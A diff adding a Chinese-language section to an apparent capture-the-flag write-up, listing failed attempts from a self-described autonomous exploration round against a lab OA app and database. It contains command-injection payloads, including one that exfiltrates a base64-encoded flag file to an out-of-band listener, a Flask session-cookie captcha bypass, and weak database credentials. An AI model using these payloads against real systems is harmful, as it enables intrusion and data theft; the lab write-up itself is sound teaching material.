@@ -312,3 +312,86 @@ secrets         4 行，含 corporate_secret = flag4
 5. **「没有回显」要先分类**：没执行 / 执行了但输出丢失 / 执行了但没权限。本例是第三种（`ping` 无权限），所以换带外通道，而不是放弃注入。
 6. **输入有长度上限时，把脚本放带外**：payload 只留「取脚本 + 执行」十几个字符。
 7. **弱口令优先于复杂利用**：最后的 MariaDB `root:root` 是最便宜的一步，但需要前面拿到容器执行权限才够得着。
+
+---
+
+## 补充：2026-10-27 本轮自主探索的失败路径
+
+### 1. 方法不对：POST 打到 `/` 拿到 405，误判成凭据错
+
+OA 的登录入口是 `POST /login`，根路径只接受 GET。
+
+| 尝试 | 结果 | 判据 |
+| --- | --- | --- |
+| `POST /` + `username/password` | `405 METHOD NOT ALLOWED` | 方法与路径不匹配，与凭据无关 |
+| `GET /` | 200，登录页 | |
+| `POST /login` + `1qaz@WSX` | 302 → 登录成功 | |
+
+**该早做的事**：看到 405 先查方法/路径，不要当成「口令不对」再去换口令。
+这一条本可以省掉一轮误判。
+
+### 2. 后台路径猜错
+
+| 路径 | 结果 | 判据 |
+| --- | --- | --- |
+| `/admin`、`/dashboard.php`、`/challenge/flag2.txt`（在 web 容器上） | 302 / 404 | 这些是 OA 的路径，不在 web 容器 |
+| `/index.php`、`/main.php`、`/home.php`（在 OA 上） | 404 | OA 首页就是 `/` |
+| `/admin/system`（GET） | 302 回 `/login` | 需要会话 |
+| `/admin/system`（POST + csrf） | 200 | |
+
+**判据**：两台机器上都有 `/admin`，但语义完全不同。跨机器猜路径之前先确认这是哪一台。
+
+### 3. 验证码：读了四次图才想到解 cookie
+
+| 尝试 | 结果 | 判据 |
+| --- | --- | --- |
+| 不带 captcha 直接 POST | `验证码错误` | |
+| 复用上一次的 captcha | 失败 | Flask 登录成功后轮换 session |
+| `GET /captcha.png` 存图人工识别（4 次） | 通过 | 4 位数字 |
+| 解 `session` cookie 的 payload | 直接得到 `{"captcha":"0609"}` | 签名 cookie 的 payload 是 Base64URL 明文 |
+
+**该早做的事**：看到 Flask 签名 cookie，先解 payload 再考虑 OCR。验证码这种字段几乎总会
+出现在 payload 里。
+
+### 4. 命令注入：注入了，但没有输出通道
+
+`/admin/system` 的 `target` 拼进 `ping`。
+
+| payload | 结果 | 判据 |
+| --- | --- | --- |
+| `127.0.0.1$(id)` | `/bin/sh: 1: ping: Operation not permitted` | **命令执行了**，是 ping 自己没权限 |
+| `127.0.0.1$(base64</challenge/flag3.txt)` | `安全检测: 发现危险字符 <` | 重定向符被拦 |
+| `$(python3 -c "…urlopen('http://172.18.0.3:9001/'+b64).read()")` | 成功 | 只剩 `$()` 可用，用 `read()` 不落盘 |
+
+关键区分：`Operation not permitted` 是 `ping` 的报错，不是 shell 的。它说明
+**注入成功、执行成功，只是包装命令本身跑不了**，所以只能走带外，不能等页面回显。
+
+### 5. 等待回显的两次空转
+
+| 尝试 | 结果 | 判据 |
+| --- | --- | --- |
+| 直接在页面里等 `ping` 输出 | 只有 `Operation not permitted` | ping 不可执行，永远不会有输出 |
+| 先试 `cat` 之类的短命令 | 被 `安全检测` 拦 | 黑名单 |
+
+### 6. 带外监听的两次失败
+
+| 现象 | 原因 | 处理 |
+| --- | --- | --- |
+| 监听进程没起来 | 前台启动，请求返回后随 PHP 进程退出 | `setsid php lis.php >/dev/null 2>&1 &` + `sleep 1` |
+| 不确定是否在听 | 没验证就发 payload | `ss -ltn \| grep 9001` 看到 `LISTEN 0.0.0.0:9001` 再发 |
+
+### 7. 内网地址与本轮实例不一致
+
+旧记录里核心库在 `172.18.0.3:3306`，本轮是 `172.18.0.4:3306`。
+
+| 尝试 | 结果 | 判据 |
+| --- | --- | --- |
+| 按旧记录的 `172.18.0.3:3306` | `TimeoutError: timed out` | 该地址上本轮没有服务 |
+| 从容器扫 `172.18.0.4:3306` | open | |
+
+**判据**：`connect` 超时无法区分「服务没开」和「地址错了」，必须先从容器里扫一遍。
+
+### 8. 手写 MySQL 协议（同 b-02）
+
+`AUTHFAIL code=254`（没处理 `AuthSwitchRequest`）→ 补 0xFE 分支；
+`3D000 No database selected`（握手未带 `CLIENT_CONNECT_WITH_DB`）→ 用 `corporate.secrets`。
